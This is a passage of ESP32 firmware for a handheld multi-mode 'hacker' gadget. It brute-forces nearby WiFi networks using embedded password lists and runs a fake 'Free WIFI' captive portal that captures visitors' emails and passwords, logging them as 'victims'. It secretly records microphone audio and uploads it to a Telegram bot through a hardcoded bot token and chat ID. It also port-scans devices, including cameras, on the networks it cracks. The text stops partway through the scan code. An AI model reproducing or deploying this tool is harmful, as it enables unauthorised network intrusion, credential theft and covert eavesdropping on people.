#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <WiFiClientSecure.h>
#include <UniversalTelegramBot.h>
#include <SPI.h>
#include <esp_wifi.h>

// ============ ОПТИМИЗАЦИЯ ПАМЯТИ ============
#define BUFFER_SIZE 24000  // Увеличено для 3 секунд записи (8000 Гц * 3 сек)
#define MAX_NETWORKS 30
#define MAX_HACKED 20
#define MAX_DEVICES 15
#define MAX_PHISHING_LOGS 20

// ============ ПИНЫ ESP32 ============
#define LED_PIN 12
#define BUTTON_PIN 0

// ============ TFT ДИСПЛЕЙ ============
#define TFT_CS   5
#define TFT_DC   4
#define TFT_RST  16

Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);

// ============ TELEGRAM ============
#define WIFI_SSID "ESP_Test"
#define WIFI_PASS "12345678"
#define BOT_TOKEN "8444193334:AAH6adrYZEg-id049jKtnl1sKkESuz25c4g"
#define CHAT_ID "5450100941"

// ============ АУДИО ============
#define MIC_PIN 34
#define SAMPLE_RATE 8000
#define RECORD_SECONDS 3  // Увеличено до 3 секунд
#define BUFFER_SIZE (SAMPLE_RATE * RECORD_SECONDS)  // 24000 семплов
#define SEND_INTERVAL 15000  // Увеличен интервал до 15 секунд для 3-секундной записи

int16_t* audioBuffer = nullptr;
WiFiClientSecure client;
UniversalTelegramBot bot(BOT_TOKEN, client);
unsigned long lastSendTime = 0;
bool audioActive = false;
unsigned long recordStartTime = 0;
bool isRecording = false;

// ============ ГЛОБАЛЬНЫЕ ============
int selectedMode = 0;
int activeMode = -1;
bool inMenu = true;
bool lastButtonState = HIGH;
unsigned long buttonPressTime = 0;
bool buttonPressed = false;
bool exitToMenu = false;

const char* modes[] = {"BRUTE 67", "PHISHING", "AUDIO", "BRUTE 20", "NET SCAN"};
int totalModes = 5;

// ============ BRUTE FORCE ============
// 60 паролей для первого режима (BRUTE 100)
const char passwords100[][16] PROGMEM = {
  "12345678", "123456789", "1234567890", "00000000", "11111111",
  "22222222", "33333333", "44444444", "55555555", "66666666",
  "77777777", "88888888", "99999999", "00000000", "password",
  "12341234", "12121212", "11223344", "12312312", "01234567",
  "98765432", "13579000", "24680000", "10203040", "01012020",
  "01012021", "20202020", "20212021", "00000001", "11111112",
  "admin123", "root1234", "user1234", "test1234", "1234qwer",
  "qwer1234", "1q2w3e4r", "000messi", "q1w2e3r4", "password1",
  "pass1234", "admin1234", "rootpass", "userpass", "1234567a",
  "1234567q", "1234567c", "1234567d", "1234567e", "1234567f",
  "abc12345", "abcd1234", "1234abcd", "adminadmin", "rootroot",
  "wifi1234", "internet", "freewifi", "connect1", "123qwe123"
};
const int PASS100_COUNT = 60;

// Второй режим (BRUTE 20) с 20 паролями
const char passwords20[][16] PROGMEM = {
  "12345678", "123456789", "1234567890", "00000000", "11111111",
  "77777777", "99999999", "55555555", "000messi", "12341234",
  "87654321", "11223344", "12121212", "12312312", "01234567",
  "98765432", "13579000", "wwwwwwww", "10203040", "01012020"
};
const int PASS20_COUNT = 20;

bool attacking = false;
String targetSSID = "";
String currentPassword = "";
int attemptCount = 0;
int foundCount = 0;
String checkedNetworks[MAX_NETWORKS];
int checkedCount = 0;
String hackedSSID[MAX_HACKED];
String hackedPass[MAX_HACKED];
int hackedRSSI[MAX_HACKED];

String availableNetworks[MAX_NETWORKS];
int availableCount = 0;
int selectedWifiIndex = 0;
bool inWifiSelect = false;

// ============ ФИШИНГ ============
const char* phishingSSID = "Free WIFI";
WebServer server(80);
DNSServer dnsServer;
const byte DNS_PORT = 53;

struct PhishingData {
  String email;
  String password;
  String device;
  String ip;
  String timestamp;
};

PhishingData phishingLogs[MAX_PHISHING_LOGS];
int phishingLogCount = 0;
bool phishingActive = false;

// ============ СКАНЕР СЕТИ ============
struct NetworkDevice {
  IPAddress ip;
  String mac;
  String vendor;
  int openPorts[20];
  String portServices[20];
  int portCount;
  String deviceType;
  int rssi;
};

NetworkDevice scannedDevices[MAX_DEVICES];
int deviceCount = 0;
bool scanningNetwork = false;
int currentScanProgress = 0;
IPAddress gatewayIP;
int selectedNetworkIndex = 0;
bool scanComplete = false;
bool scanCancelled = false;

// Расширенный список портов с добавлением RTSP и камер
struct PortInfo {
  int port;
  const char* service;
  const char* description;
};

PortInfo portList[] = {
  // Основные сервисы
  {21, "FTP", "File Transfer"},
  {22, "SSH", "Secure Shell"},
  {23, "Telnet", "Remote Access"},
  {25, "SMTP", "Email"},
  {53, "DNS", "Domain Name"},
  {80, "HTTP", "Web Server"},
  {110, "POP3", "Email"},
  {139, "NetBIOS", "File Sharing"},
  {143, "IMAP", "Email"},
  {443, "HTTPS", "Secure Web"},
  {445, "SMB", "Windows Share"},
  
  // Порты для камер и видеонаблюдения
  {554, "RTSP", "Camera Stream"},
  {8554, "RTSP-Alt", "Camera Stream Alt"},
  {8000, "ONVIF", "IP Camera"},
  {8080, "HTTP-Alt", "Web Alt"},
  {8081, "Camera-Web", "IP Camera Web"},
  {8443, "HTTPS-Alt", "Secure Web Alt"},
  
  // Базы данных и другие сервисы
  {3306, "MySQL", "Database"},
  {3389, "RDP", "Remote Desktop"},
  {5432, "PostgreSQL", "Database"},
  {5900, "VNC", "Remote Control"},
  
  // Специфичные для камер
  {37777, "DVR", "Dahua Camera"},
  {34567, "DVR", "Hikvision Camera"},
  {80, "Camera", "IP Camera Web"},
  {8000, "Camera", "IP Camera RTSP"}
};
const int totalPorts = 24;  // Увеличено до 24 портов

// OUI база данных
struct OUIMap {
  const char* prefix;
  const char* vendor;
};

OUIMap ouiDB[] = {
  {"00:14:22", "Dell"}, {"00:1A:11", "D-Link"}, {"00:1C:DF", "TP-Link"},
  {"00:23:69", "Cisco"}, {"00:1E:8C", "Netgear"}, {"00:25:9C", "Huawei"},
  {"00:0C:29", "VMware"}, {"08:00:27", "VirtualBox"}, {"B8:27:EB", "Raspberry Pi"},
  {"DC:A6:32", "Apple"}, {"F4:F5:D8", "Samsung"}, {"00:1B:21", "Intel"},
  {"00:1F:33", "ASUS"}, {"00:0A:95", "HP"}, {"00:21:5A", "Sony"},
  // Производители камер
  {"00:1A:2B", "Hikvision"}, {"00:12:31", "Dahua"}, {"00:0E:53", "Axis"},
  {"00:40:8C", "Sony"}, {"00:1C:F4", "Panasonic"}
};

// ============ ПРОТОТИПЫ ============
void showMenu();
void showWifiSelection();
void updateBruteDisplay();
void updatePhishingDisplay();
void updateAudioDisplay();
void updateScanDisplay();
void showSuccessScreen(String ssid, String pass);
void showScanProgress(IPAddress ip, int currentIP, int totalIPs, int devicesFound);
void showDeviceScanDetails(int deviceIndex);
String generateLoginPage();
void checkButton();
bool isNetworkChecked(String ssid);
void addToChecked(String ssid);
void scanForWifiNetworks();
void startAttackOnSelectedWifi();
void attackNetwork(int totalPasswords, const char passwords[][16]);
void startPhishing();
void initAudioMode();
void sendVoiceSimple();
void startNetworkScan();
void performNetworkScanDetailed();
String getMacAddress(IPAddress ip);
String getVendorFromMac(String mac);
String identifyDeviceTypeDetailed(int deviceIndex);
void saveScanResults();

// ============ SETUP ============
void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  pinMode(BUTTON_PIN, INPUT_PULLUP);
  pinMode(MIC_PIN, INPUT);
  
  audioBuffer = (int16_t*)malloc(BUFFER_SIZE * sizeof(int16_t));
  if(audioBuffer == nullptr) {
    Serial.println("Audio buffer allocation failed!");
  }
  
  tft.initR(INITR_BLACKTAB);
  tft.fillScreen(ST7735_BLACK);
  tft.setTextColor(ST7735_WHITE);
  tft.setTextSize(1);
  
  // Анимация загрузки
  tft.fillScreen(ST7735_BLACK);
  for(int i = 0; i <= 100; i += 10) {
    tft.drawRect(0, 0, 127, 159, ST7735_WHITE);
    tft.setTextSize(3);
    tft.setCursor(35, 40);
    tft.println("5in1");
    tft.setTextSize(2);
    tft.setCursor(30, 80);
    tft.println("HACKER");
    tft.drawRect(30, 120, 70, 8, ST7735_WHITE);
    tft.fillRect(31, 121, (i * 68) / 100, 6, ST7735_GREEN);
    delay(80);
  }
  delay(500);
  
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  delay(100);
  
  showMenu();
}

// ============ LOOP ============
void loop() {
  checkButton();
  
  if(exitToMenu) {
    exitToMenu = false;
    activeMode = -1;
    attacking = false;
    inWifiSelect = false;
    scanningNetwork = false;
    phishingActive = false;
    audioActive = false;
    isRecording = false;
    WiFi.disconnect(true);
    inMenu = true;
    showMenu();
  }
  
  if(activeMode != -1) {
    switch(activeMode) {
      case 0: case 3:
        if (!attacking && !inWifiSelect) {
          scanForWifiNetworks();
        } else if (inWifiSelect) {
          showWifiSelection();
        } else if (attacking) {
          if(activeMode == 0) {
            attackNetwork(PASS100_COUNT, passwords100);
          } else {
            attackNetwork(PASS20_COUNT, passwords20);
          }
        }
        break;
      case 1:
        if(!phishingActive) {
          startPhishing();
          phishingActive = true;
        }
        dnsServer.processNextRequest();
        server.handleClient();
        updatePhishingDisplay();
        break;
      case 2:
        if(!audioActive && audioBuffer != nullptr) {
          initAudioMode();
          audioActive = true;
          lastSendTime = millis();
        }
        if (audioActive && millis() - lastSendTime >= SEND_INTERVAL) {
          digitalWrite(LED_PIN, HIGH);
          isRecording = true;
          recordStartTime = millis();
          
          // Запись аудио с реальной скоростью
          for(int i = 0; i < BUFFER_SIZE; i++) {
            audioBuffer[i] = analogRead(MIC_PIN) - 2048;
            // Точная задержка для реальной частоты дискретизации
            delayMicroseconds(1000000 / SAMPLE_RATE);
            
            // Обновляем дисплей во время записи
            if(i % 1000 == 0) {
              int progress = (i * 100) / BUFFER_SIZE;
              tft.fillRect(70, 130, 50, 8, ST7735_BLACK);
              tft.fillRect(70, 130, progress / 2, 8, ST7735_RED);
            }
          }
          
          isRecording = false;
          digitalWrite(LED_PIN, LOW);
          sendVoiceSimple();
          lastSendTime = millis();
        }
        updateAudioDisplay();
        break;
      case 4:
        if (!scanningNetwork && !scanComplete && foundCount > 0) {
          updateScanDisplay();
        } else if (scanningNetwork) {
          performNetworkScanDetailed();
        } else if (scanComplete && !scanCancelled && deviceCount > 0) {
          showDeviceScanDetails(selectedNetworkIndex);
        } else if (foundCount == 0) {
          tft.fillScreen(ST7735_BLACK);
          tft.drawRect(0, 0, 127, 159, ST7735_WHITE);
          tft.setTextSize(2);
          tft.setCursor(15, 50);
          tft.setTextColor(ST7735_RED);
          tft.println("NO HACKED");
          tft.setCursor(15, 80);
          tft.println("NETWORKS");
          tft.setTextSize(1);
          tft.setCursor(20, 120);
          tft.println("Hack WiFi 1st!");
          delay(100);
        }
        break;
    }
  }
  delay(10);
}

// ============ МЕНЮ ============
void showMenu() {
  inMenu = true;
  tft.fillScreen(ST7735_BLACK);
  
  for(int i = 0; i < 10; i++) {
    tft.drawRect(i, i, 127 - i*2, 159 - i*2, ST7735_BLUE);
  }
  
  tft.setTextSize(2);
  tft.setCursor(10, 8);
  tft.setTextColor(ST7735_YELLOW);
  tft.println("DRTOOL");
  tft.setTextSize(1);
  tft.drawLine(0, 28, 127, 28, ST7735_WHITE);
  
  int y = 40;
  for(int i = 0; i < totalModes; i++) {
    if(i == selectedMode) {
      tft.setTextColor(ST7735_BLACK);
      tft.fillRect(5, y-3, 117, 18, ST7735_GREEN);
      tft.setCursor(12, y);
      tft.print(modes[i]);
    } else {
      tft.setTextColor(ST7735_WHITE);
      tft.setCursor(12, y);
      tft.print(modes[i]);
    }
    y += 24;
  }
  
  tft.setTextColor(ST7735_CYAN);
  tft.setCursor(8, 145);
  tft.print("HACKED: ");
  tft.print(foundCount);
}

// ============ BRUTE FORCE ============
bool isNetworkChecked(String ssid) {
  for(int i = 0; i < checkedCount; i++) {
    if(checkedNetworks[i] == ssid) return true;
  }
  return false;
}

void addToChecked(String ssid) {
  if(checkedCount < MAX_NETWORKS) {
    checkedNetworks[checkedCount] = ssid;
    checkedCount++;
  }
}

void scanForWifiNetworks() {
  tft.fillScreen(ST7735_BLACK);
  tft.drawRect(0, 0, 127, 159, ST7735_WHITE);
  tft.setTextSize(2);
  tft.setCursor(15, 20);
  tft.setTextColor(ST7735_YELLOW);
  tft.println("SCANNING");
  tft.setTextSize(1);
  
  for(int i = 0; i < 3; i++) {
    tft.setCursor(15, 60);
    tft.setTextColor(ST7735_WHITE);
    tft.print("Looking for WiFi");
    for(int j = 0; j <= i; j++) tft.print(".");
    for(int j = i+1; j < 3; j++) tft.print(" ");
    delay(500);
  }
  
  int n = WiFi.scanNetworks();
  availableCount = 0;
  
  if (n > 0) {
    for (int i = 0; i < n && availableCount < MAX_NETWORKS; i++) {
      String ssid = WiFi.SSID(i);
      if (ssid.length() > 0 && ssid.length() < 32 && !isNetworkChecked(ssid)) {
        availableNetworks[availableCount] = ssid;
        availableCount++;
      }
    }
  }
  
  WiFi.scanDelete();
  
  if (availableCount > 0) {
    selectedWifiIndex = 0;
    inWifiSelect = true;
    showWifiSelection();
  } else {
    tft.fillScreen(ST7735_BLACK);
    tft.drawRect(0, 0, 127, 159, ST7735_WHITE);
    tft.setTextSize(2);
    tft.setCursor(15, 40);
    tft.setTextColor(ST7735_RED);
    tft.println("NO NEW");
    tft.setCursor(15, 70);
    tft.println("NETWORKS");
    tft.setTextSize(1);
    tft.setCursor(15, 110);
    tft.setTextColor(ST7735_WHITE);
    tft.print("HACKED: ");
    tft.println(foundCount);
    delay(3000);
    inWifiSelect = false;
    attacking = false;
  }
}

void showWifiSelection() {
  tft.fillScreen(ST7735_BLACK);
  tft.drawRect(0, 0, 127, 159, ST7735_WHITE);
  
  tft.setTextSize(1);
  tft.setCursor(5, 5);
  tft.setTextColor(ST7735_CYAN);
  tft.print("SELECT TARGET");
  tft.setCursor(95, 5);
  tft.setTextColor(ST7735_RED);
  tft.print("[EXIT]");
  tft.drawLine(0, 18, 127, 18, ST7735_WHITE);
  
  tft.setTextColor(ST7735_YELLOW);
  tft.setCursor(5, 28);
  tft.print("AVAILABLE: ");
  tft.print(availableCount);
  tft.drawLine(0, 42, 127, 42, ST7735_WHITE);
  
  int y = 52;
  int displayStart = 0;
  
  if(selectedWifiIndex >= 4) {
    displayStart = selectedWifiIndex - 3;
  }
  
  for(int i = displayStart; i < availableCount && i < displayStart + 5; i++) {
    if(i == selectedWifiIndex) {
      tft.setTextColor(ST7735_BLACK);
      tft.fillRect(0, y-3, 127, 18, ST7735_GREEN);
      tft.setCursor(8, y);
      tft.print("> ");
    } else {
      tft.setTextColor(ST7735_WHITE);
      tft.setCursor(18, y);
      tft.print("  ");
    }
    tft.print(i+1);
    tft.print(". ");
    tft.print(availableNetworks[i].substring(0, 14));
    y += 22;
  }
  
  tft.setTextColor(ST7735_CYAN);
  tft.setCursor(8, 145);
  tft.print("8.9v");
  
  if(digitalRead(BUTTON_PIN) == LOW) {
    unsigned long pressStart = millis();
    bool shortPress = true;
    while(digitalRead(BUTTON_PIN) == LOW) {
      delay(20);
      if(millis() - pressStart > 2000) {
        startAttackOnSelectedWifi();
        shortPress = false;
        break;
      }
    }
    if(shortPress && millis() - pressStart < 2000) {
      selectedWifiIndex = (selectedWifiIndex + 1) % availableCount;
      showWifiSelection();
      delay(300);
    }
  }
}

void startAttackOnSelectedWifi() {
  if(selectedWifiIndex < availableCount) {
    targetSSID = availableNetworks[selectedWifiIndex];
    attacking = true;
    attemptCount = 0;
    inWifiSelect = false;
  }
}

void updateBruteDisplay() {
  if(activeMode != 0 && activeMode != 3) return;
  
  tft.fillScreen(ST7735_BLACK);
  tft.drawRect(0, 0, 127, 159, ST7735_WHITE);
  
  tft.setTextSize(1);
  tft.setCursor(5, 5);
  tft.setTextColor(ST7735_CYAN);
  tft.print(activeMode == 0 ? "BRUTE 67" : "BRUTE 20");
  tft.setCursor(95, 5);
  tft.setTextColor(ST7735_RED);
  tft.print("[EXIT]");
  tft.drawLine(0, 18, 127, 18, ST7735_WHITE);
  
  tft.setTextSize(1);
  tft.setTextColor(ST7735_YELLOW);
  tft.setCursor(5, 28);
  tft.print("TARGET:");
  tft.setTextColor(ST7735_WHITE);
  tft.setCursor(5, 40);
  tft.println(targetSSID.substring(0, 18));
  
  int total = (activeMode == 0) ? PASS100_COUNT : PASS20_COUNT;
  
  tft.setCursor(5, 58);
  tft.setTextColor(ST7735_YELLOW);
  tft.print("PROGRESS:");
  tft.setTextColor(ST7735_WHITE);
  tft.setCursor(5, 70);
  tft.print(attemptCount);
  tft.print("/");
  tft.println(total);
  
  int progress = (attemptCount * 100) / total;
  tft.drawRect(5, 85, 100, 12, ST7735_WHITE);
  tft.fillRect(5, 85, progress, 12, ST7735_GREEN);
  tft.setCursor(110, 87);
  tft.print(progress);
  tft.println("%");
  
  tft.drawLine(0, 105, 127, 105, ST7735_WHITE);
  
  tft.setTextSize(1);
  tft.setTextColor(ST7735_YELLOW);
  tft.setCursor(5, 112);
  tft.print("TRYING:");
  tft.setTextSize(1);
  tft.setTextColor(ST7735_GREEN);
  tft.setCursor(5, 125);
  tft.println(currentPassword.substring(0, 14));
}

void attackNetwork(int totalPasswords, const char passwords[][16]) {
  char password[16];
  
  for (int i = 0; i < totalPasswords; i++) {
    attemptCount = i + 1;
    strcpy_P(password, passwords[i]);
    currentPassword = String(password);
    updateBruteDisplay();
    digitalWrite(LED_PIN, HIGH);
    
    WiFi.begin(targetSSID.c_str(), currentPassword.c_str());
    
    unsigned long start = millis();
    bool connected = false;
    
    while (millis() - start < 4000) {
      delay(80);
      digitalWrite(LED_PIN, !digitalRead(LED_PIN));
      if (WiFi.status() == WL_CONNECTED) {
        connected = true;
        break;
      }
    }
    
    digitalWrite(LED_PIN, LOW);
    
    if (connected && WiFi.status() == WL_CONNECTED) {
      delay(500);
      if (foundCount < MAX_HACKED) {
        hackedSSID[foundCount] = targetSSID;
        hackedPass[foundCount] = currentPassword;
        hackedRSSI[foundCount] = WiFi.RSSI();
        foundCount++;
        addToChecked(targetSSID);
      }
      
      showSuccessScreen(targetSSID, currentPassword);
      return;
    } else {
      WiFi.disconnect(true);
    }
    delay(30);
  }
  
  addToChecked(targetSSID);
  
  tft.fillScreen(ST7735_BLACK);
  tft.drawRect(0, 0, 127, 159, ST7735_WHITE);
  tft.setTextSize(2);
  tft.setCursor(25, 60);
  tft.setTextColor(ST7735_RED);
  tft.println("FAILED");
  tft.setTextSize(1);
  tft.setCursor(20, 90);
  tft.setTextColor(ST7735_WHITE);
  tft.println(targetSSID.substring(0, 16));
  delay(2000);
  
  attacking = false;
  inWifiSelect = false;
}

void showSuccessScreen(String ssid, String pass) {
  for (int flash = 0; flash < 5; flash++) {
    tft.invertDisplay(true);
    digitalWrite(LED_PIN, HIGH);
    delay(150);
    tft.invertDisplay(false);
    digitalWrite(LED_PIN, LOW);
    delay(150);
  }
  
  tft.fillScreen(ST7735_BLACK);
  tft.drawRect(0, 0, 127, 159, ST7735_WHITE);
  
  tft.setTextSize(2);
  tft.setTextColor(ST7735_GREEN);
  tft.setCursor(20, 15);
  tft.println("HACKED!");
  
  tft.setTextSize(1);
  tft.setTextColor(ST7735_YELLOW);
  tft.setCursor(5, 45);
  tft.print("SSID:");
  tft.setTextColor(ST7735_WHITE);
  tft.setCursor(5, 57);
  tft.println(ssid.substring(0, 18));
  
  tft.setTextColor(ST7735_YELLOW);
  tft.setCursor(5, 75);
  tft.print("PASS:");
  tft.setTextColor(ST7735_GREEN);
  tft.setCursor(5, 87);
  tft.println(pass);
  
  tft.setTextColor(ST7735_YELLOW);
  tft.setCursor(5, 105);
  tft.print("SIGNAL:");
  tft.setTextColor(ST7735_WHITE);
  tft.setCursor(5, 117);
  tft.print(WiFi.RSSI());
  tft.println(" dBm");
  
  tft.setTextSize(1);
  tft.setTextColor(ST7735_CYAN);
  tft.setCursor(15, 140);
  tft.println("PRESS BOOT");
  
  bool buttonPressed = false;
  unsigned long startWait = millis();
  while(!buttonPressed && millis() - startWait < 30000) {
    if(digitalRead(BUTTON_PIN) == LOW) {
      delay(300);
      buttonPressed = true;
    }
    delay(10);
  }
  
  exitToMenu = true;
  WiFi.disconnect(true);
}

// ============ ФИШИНГ ============
String generateLoginPage() {
  return "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Free WiFi</title><style>*{margin:0;padding:0;box-sizing:border-box;}body{min-height:100vh;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;}.card{background:white;border-radius:20px;max-width:400px;width:100%;padding:30px;}.header{text-align:center;margin-bottom:30px;}.wifi-icon{font-size:50px;margin-bottom:10px;}h1{color:#667eea;}.input-group{margin-bottom:20px;}input{width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:10px;}.btn{width:100%;padding:12px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border:none;border-radius:10px;font-size:16px;cursor:pointer;}</style></head><body><div class='card'><div class='header'><div class='wifi-icon'>📶</div><h1>Free WiFi Access</h1></div><form action='/login' method='POST'><div class='input-group'><input type='email' name='email' placeholder='Email' required></div><div class='input-group'><input type='password' name='password' placeholder='Password' required></div><button type='submit' class='btn'>Connect</button></form></div></body></html>";
}

void startPhishing() {
  WiFi.softAP(phishingSSID);
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  
  server.on("/", []() { server.send(200, "text/html", generateLoginPage()); });
  
  server.on("/login", HTTP_POST, []() {
    String email = server.arg("email");
    String password = server.arg("password");
    
    if(phishingLogCount < MAX_PHISHING_LOGS) {
      phishingLogs[phishingLogCount].email = email;
      phishingLogs[phishingLogCount].password = password;
      phishingLogs[phishingLogCount].ip = server.client().remoteIP().toString();
      phishingLogCount++;
    }
    
    for(int i=0;i<3;i++){digitalWrite(LED_PIN,HIGH);delay(100);digitalWrite(LED_PIN,LOW);delay(100);}
    tft.invertDisplay(true);delay(200);tft.invertDisplay(false);
    
    server.send(200, "text/html", "<html><body style='background:linear-gradient(135deg,#667eea,#764ba2);display:flex;justify-content:center;align-items:center;height:100vh;'><div style='background:white;padding:40px;border-radius:20px;text-align:center'><h2 style='color:#667eea'>✅ Connected!</h2><p>You now have WiFi access</p></div></body></html>");
  });
  
  server.onNotFound([]() { server.send(200, "text/html", generateLoginPage()); });
  server.begin();
}

void updatePhishingDisplay() {
  if(activeMode != 1) return;
  
  tft.fillScreen(ST7735_BLACK);
  tft.drawRect(0, 0, 127, 159, ST7735_WHITE);
  tft.setTextSize(1);
  tft.setCursor(5, 5);
  tft.setTextColor(ST7735_CYAN);
  tft.print("PHISHING MODE");
  tft.setCursor(95, 5);
  tft.setTextColor(ST7735_RED);
  tft.print("[EXIT]");
  tft.drawLine(0, 18, 127, 18, ST7735_WHITE);
  
  tft.setTextColor(ST7735_YELLOW);
  tft.setCursor(5, 28);
  tft.print("SSID: ");
  tft.setTextColor(ST7735_WHITE);
  tft.println(phishingSSID);
  
  tft.setTextColor(ST7735_YELLOW);
  tft.setCursor(5, 43);
  tft.print("IP: ");
  tft.setTextColor(ST7735_WHITE);
  tft.println(WiFi.softAPIP().toString());
  
  tft.setTextColor(ST7735_YELLOW);
  tft.setCursor(5, 58);
  tft.print("VICTIMS: ");
  tft.setTextColor(ST7735_GREEN);
  tft.println(phishingLogCount);
  
  tft.drawLine(0, 73, 127, 73, ST7735_WHITE);
  
  if(phishingLogCount > 0) {
    int last = phishingLogCount - 1;
    tft.setTextColor(ST7735_YELLOW);
    tft.setCursor(5, 80);
    tft.print("LAST:");
    tft.setTextColor(ST7735_WHITE);
    tft.setCursor(5, 92);
    tft.print(phishingLogs[last].email.substring(0, 14));
    tft.setCursor(5, 107);
    tft.print(phishingLogs[last].password.substring(0, 14));
  }
}

// ============ АУДИО ============
void initAudioMode() {
  if (WiFi.status() != WL_CONNECTED) {
    WiFi.begin(WIFI_SSID, WIFI_PASS);
    int attempts = 0;
    while(WiFi.status() != WL_CONNECTED && attempts < 20) {
      delay(500);
      attempts++;
    }
  }
  if(WiFi.status() == WL_CONNECTED){
    client.setInsecure();
    bot.sendMessage(CHAT_ID, "🎤 Audio activated (3 sec recording)", "");
  }
}

void sendVoiceSimple() {
  if(audioBuffer == nullptr) return;
  
  uint32_t dataSize = BUFFER_SIZE * 2;
  uint32_t fileSize = dataSize + 36;
  uint8_t wavHeader[44] = {
    'R','I','F','F',
    (uint8_t)(fileSize & 0xFF), (uint8_t)((fileSize >> 8) & 0xFF),
    (uint8_t)((fileSize >> 16) & 0xFF), (uint8_t)((fileSize >> 24) & 0xFF),
    'W','A','V','E','f','m','t',' ',
    16,0,0,0,1,0,1,0,
    (uint8_t)(SAMPLE_RATE & 0xFF), (uint8_t)((SAMPLE_RATE >> 8) & 0xFF),
    (uint8_t)((SAMPLE_RATE >> 16) & 0xFF), (uint8_t)((SAMPLE_RATE >> 24) & 0xFF),
    (uint8_t)((SAMPLE_RATE * 2) & 0xFF), (uint8_t)(((SAMPLE_RATE * 2) >> 8) & 0xFF),
    (uint8_t)(((SAMPLE_RATE * 2) >> 16) & 0xFF), (uint8_t)(((SAMPLE_RATE * 2) >> 24) & 0xFF),
    2,0,16,0,
    'd','a','t','a',
    (uint8_t)(dataSize & 0xFF), (uint8_t)((dataSize >> 8) & 0xFF),
    (uint8_t)((dataSize >> 16) & 0xFF), (uint8_t)((dataSize >> 24) & 0xFF)
  };
  
  if(!client.connect("api.telegram.org", 443)) return;
  
  String boundary = "----ESP32Boundary";
  String bodyStart = "--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + String(CHAT_ID) + "\r\n--" + boundary + "\r\nContent-Disposition: form-data; name=\"voice\"; filename=\"audio.wav\"\r\nContent-Type: audio/wav\r\n\r\n";
  String bodyEnd = "\r\n--" + boundary + "--\r\n";
  
  int contentLength = bodyStart.length() + 44 + dataSize + bodyEnd.length();
  
  client.println("POST /bot" + String(BOT_TOKEN) + "/sendVoice HTTP/1.1");
  client.println("Host: api.telegram.org");
  client.println("Content-Type: multipart/form-data; boundary=" + boundary);
  client.println("Content-Length: " + String(contentLength));
  client.println();
  client.print(bodyStart);
  client.write(wavHeader, 44);
  
  int bytesSent = 0;
  while(bytesSent < dataSize) {
    int chunkSize = 1024;
    if(bytesSent + chunkSize > dataSize) chunkSize = dataSize - bytesSent;
    client.write((uint8_t*)audioBuffer + bytesSent, chunkSize);
    bytesSent += chunkSize;
  }
  
  client.print(bodyEnd);
  client.stop();
}

void updateAudioDisplay() {
  if(activeMode != 2) return;
  
  tft.fillScreen(ST7735_BLACK);
  tft.drawRect(0,0,127,159,ST7735_WHITE);
  tft.setTextSize(1);
  tft.setCursor(5,5);
  tft.setTextColor(ST7735_CYAN);
  tft.print("AUDIO MODE");
  tft.setCursor(95,5);
  tft.setTextColor(ST7735_RED);
  tft.print("[EXIT]");
  tft.drawLine(0,18,127,18,ST7735_WHITE);
  
  int micValue = analogRead(MIC_PIN);
  int level = map(micValue, 0, 4095, 0, 100);
  level = constrain(level, 0, 100);
  
  tft.setTextColor(ST7735_YELLOW);
  tft.setCursor(5,28);
  tft.print("MIC:");
  tft.setTextColor(ST7735_WHITE);
  tft.setCursor(5,40);
  tft.print(micValue);
  
  tft.fillRect(5,55,100,12,ST7735_WHITE);
  tft.fillRect(5,55,level,12,ST7735_GREEN);
  
  tft.setTextColor(ST7735_YELLOW);
  tft.setCursor(5,78);
  tft.print("WiFi:");
  tft.setTextColor(WiFi.status() == WL_CONNECTED ? ST7735_GREEN : ST7735_RED);
  tft.setCursor(5,88);
  tft.print(WiFi.status() == WL_CONNECTED ? "OK" : "NO");
  
  int secondsLeft = (SEND_INTERVAL - (millis() - lastSendTime)) / 1000;
  if(secondsLeft < 0) secondsLeft = 0;
  tft.setTextColor(ST7735_YELLOW);
  tft.setCursor(5,108);
  tft.print("NEXT:");
  tft.setTextColor(ST7735_WHITE);
  tft.setCursor(5,118);
  tft.print(secondsLeft);
  tft.print("s");
  
  // Индикатор записи
  if(isRecording) {
    tft.fillCircle(110, 140, 8, ST7735_RED);
    tft.setTextColor(ST7735_RED);
    tft.setCursor(70, 132);
    tft.print("REC 3s");
    
    // Показываем прогресс записи
    int recordProgress = ((millis() - recordStartTime) * 100) / 3000;
    if(recordProgress <= 100) {
      tft.fillRect(70, 145, recordProgress / 2, 5, ST7735_RED);
    }
  } else {
    int barHeight = map(micValue, 0, 4095, 0, 35);
    tft.fillRect(110, 130 - barHeight, 10, barHeight, ST7735_GREEN);
  }
}

// ============ СКАНЕР СЕТИ ============
void updateScanDisplay() {
  if(activeMode != 4) return;
  
  tft.fillScreen(ST7735_BLACK);
  tft.drawRect(0,0,127,159,ST7735_WHITE);
  tft.setTextSize(1);
  tft.setCursor(5,5);
  tft.setTextColor(ST7735_CYAN);
  tft.print("NETWORK SCAN");
  tft.setCursor(95,5);
  tft.setTextColor(ST7735_RED);
  tft.print("[EXIT]");
  tft.drawLine(0,18,127,18,ST7735_WHITE);
  
  tft.setTextColor(ST7735_YELLOW);
  tft.setCursor(5,28);
  tft.print("SELECT NETWORK:");
  tft.drawLine(0,42,127,42,ST7735_WHITE);
  
  int y = 52;
  for(int i = 0; i < foundCount && i < 5; i++) {
    if(i == selectedNetworkIndex) {
      tft.setTextColor(ST7735_BLACK);
      tft.fillRect(0, y-3, 127, 18, ST7735_GREEN);
      tft.setCursor(8, y);
      tft.print(">");
    } else {
      tft.setTextColor(ST7735_WHITE);
      tft.setCursor(18, y);
      tft.print("  ");
    }
    tft.print(hackedSSID[i].substring(0, 14));
    y += 22;
  }
  
  tft.setTextColor(ST7735_CYAN);
  tft.setCursor(8, 145);
  tft.print("8.9v");
  
  if(digitalRead(BUTTON_PIN) == LOW) {
    unsigned long pressStart = millis();
    bool longPress = false;
